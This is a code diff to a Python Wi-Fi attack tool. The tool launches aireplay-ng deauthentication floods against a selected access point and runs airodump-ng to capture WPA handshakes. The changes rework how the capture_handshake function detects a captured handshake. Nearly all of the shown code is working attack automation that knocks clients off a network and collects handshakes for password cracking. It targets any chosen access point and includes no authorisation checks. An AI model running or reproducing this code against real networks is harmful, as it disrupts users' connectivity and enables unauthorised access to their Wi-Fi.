@@ -24,7 +24,8 @@ terminal_pids = []
 
 terminals = ['x-terminal-emulator', 'gnome-terminal', 'konsole', 'xfce4-terminal']
 terminal_positions = [(0, 0), (0, 400), (0, 800), (800, 0), (800, 400),
-                      (800, 800)] 
+                      (800, 800)]
+
 
 def check_for_q_press(interval=0.1, timeout=3):
     start_time = time.time()
@@ -139,7 +140,6 @@ def popen_command_new_terminal(command):
                 position_index = len(terminal_pids) % 6
                 x, y = terminal_positions[position_index]
                 terminal_command = f"{terminal} --geometry=80x24+{x}+{y} -e '/bin/sh -c \"{command}; exec bash\"'"
-                # terminal_command = f"{terminal} -e /bin/sh -c '{command}; exec bash'"
             elif terminal == 'konsole':
                 terminal_command = f"{terminal} -e /bin/sh -c '{command}; exec bash'"
             elif terminal == 'xfce4-terminal':
@@ -411,7 +411,6 @@ def select_target_device():
     devices = []
     for row in output.split('\n'):
         column = row.split()
-        # print(repr(column))
         if len(column) >= 7 and str(column[0] == target_bssid) and len(column[1]) == 17:
             device = column[1]
             if device not in devices and device != target_bssid:
@@ -632,7 +631,6 @@ def capture_packets():
 
 def capture_handshake():
     clear()
-
     if not target_ap:
         print(f'Select a {yellow("target AP")} to continue with this attack')
         if input(f'Select a {yellow("target AP")} Y/N : ').lower() == 'y':
@@ -644,90 +642,68 @@ def capture_handshake():
         print(
             f'Switching channel on  {green(selected_interface)} to {green(target_channel)}')
         switch_interface_channel()
-
         target_directory = f'/tmp/{target_ap}-handshakeCapture'
         os.makedirs(target_directory, exist_ok=True)
-
         airodump_handshake_capture_location = f'/tmp/{target_ap}-handshakeCapture/{target_ap}'
-
         print(f'Writing Capture files to {yellow(target_directory)}')
-
         aireplay = popen_command_new_terminal(f'aireplay-ng --deauth 0 -a {target_bssid} {selected_interface}')
-
-        output_file_path = '/tmp/airodump_output_fifo'
-        def monitor_output_file(output_file_path, handshake_detected_event):
-            pattern = re.compile(r'handshake', re.IGNORECASE)
-            try:
-                with open(output_file_path, 'r') as f:
-                    while not handshake_detected_event.is_set():
-                        line = f.readline()
-                        if line:
-                            print(line, end='')  
-                            if pattern.search(line):
-                                handshake_detected_event.set()
-                                break
-                        else:
-                            time.sleep(0.1)
-            except Exception as e:
-                print(f"Error reading output file: {e}")
-
-        handshake_detected_event = threading.Event()
-
-        monitor_thread = threading.Thread(target=monitor_output_file, args=(output_file_path, handshake_detected_event))
-        monitor_thread.start()
-
-        airodump_command = f'airodump-ng --bssid {target_bssid} -c {target_channel} -w {airodump_handshake_capture_location} {selected_interface} > {fifo_path} 2>&1'
-
-        airodump = popen_command_new_terminal(airodump_command)
+        airodump_output_file = f'/tmp/{random.randint(1000000, 9999999)}.txt'
+        airodump = popen_command_new_terminal(
+            f'airodump-ng --bssid {target_bssid} -c {target_channel} -w {airodump_handshake_capture_location} {selected_interface} | tee {airodump_output_file}'
+        )
 
         timeout = 30
-        while timeout > 0:
-            print(f"Remaining time {timeout} seconds. Press Q to cancel")
+        while timeout != 0:
+            print(f"Remaining time {green(timeout)} Press Q to cancel")
             if check_for_q_press(timeout=1):
                 print("Loop canceled by user.")
                 time.sleep(1)
                 break
-            if handshake_detected_event.is_set():
-                break
             timeout -= 1
+        os.killpg(airodump.pid, signal.SIGTERM)
+        airodump_output = ''
 
+        with open(airodump_output_file, 'r') as file:
+            airodump_output = file.read()
+
+        os.remove(airodump_output_file)
         try:
             os.killpg(aireplay.pid, signal.SIGTERM)
             aireplay.wait()
         except ProcessLookupError:
             print('aireplay killed unexpectedly', ProcessLookupError)
-
-        if handshake_detected_event.is_set():
-            clear()
-            print(f"\nHandshake capture {green('SUCCESSFUL')}")
-            print(f"Handshake is saved in '/tmp/{target_ap}-handshakeCapture/'")
-            input('Press enter to return to network attacks menu')
-            print(f"\nHandshake capture {green('SUCCESSFUL')}")
-            print(f"Handshake is saved in '/tmp/{target_ap}-handshakeCapture/'")
-            input('input anything to return to network attacks menu')
-            return
-        else:
-            clear()
-            print(f'Handshake capture {red("FAILED")}')
-            clear()
-            print(f'Handshake capture {red("FAILED")}')
-            print(
-                'Remember that in order to capture the handshake '
-                'a device must try to connect to the target SSID')
-            print(
-                'Reason for no handshake might be that no device was deauthenticated. '
-                'Try changing the timeout variable of this script in the source code')
-            print(
-                'Or it might be that the deauthenticated devices did not try to reconnect to the SSID '
-                '(might happen if only a small amount of devices are connected to target SSID)')
-            remove_files_with_prefix(f'/tmp/{target_ap}-handshakeCapture',
-                                     f'{target_ap}')
-            os.rmdir(f'/tmp/{target_ap}-handshakeCapture')
-            input(
-                f' press enter to return to network attacks menu and select {green("C2")} to capture the handshake for {green(target_ap)}')
+        try:
+            pattern = re.compile(r'handshake:')
+            airodump.wait()
+            match = pattern.search(airodump_output)
+            if match:
+                clear()
+                print(f"\nHandshake capture {green('SUCCESSFUL')}")
+                print(f"Handshake is saved in '/tmp/{target_ap}-handshakeCapture/'")
+                input('input anything to return to network attacks menu')
+                return
+            else:
+                clear()
+                print(f'Handshake capture {red("FAILED")}')
+                print(
+                    'Remember that in order to capture the handshake '
+                    'a device must try to connect to the target SSID')
+                print(
+                    'Reason for no handshake might be that no device was deauthenticated. '
+                    'Try changing the timeout variable of this script in the source code')
+                print(
+                    'Or it might be that the deauthenticated devices did not try to reconnect to the SSID '
+                    '(might happen if only a small amount of devices are connected to target SSID)')
+                remove_files_with_prefix(f'/tmp/{target_ap}-handshakeCapture',
+                                         f'{target_ap}')
+                os.rmdir(f'/tmp/{target_ap}-handshakeCapture')
+                input(
+                    f' press enter to return to network attacks menu and select {green("C2")} to capture the handshake for {green(target_ap)}')
+        except ProcessLookupError:
+            print('airodump killed unexpectedly', ProcessLookupError)
     else:
         clear()
-        print(f'{target_ap_authentication} authentication is not supported for handshake capture')
+        print('{target_ap_authentication} authentication is not supported for handshake capture')
         print('Only PSK authentication is supported for handshake capture')
         input(f"Press enter to return and select a AP that uses {yellow('PSK')} Authentication")
         return
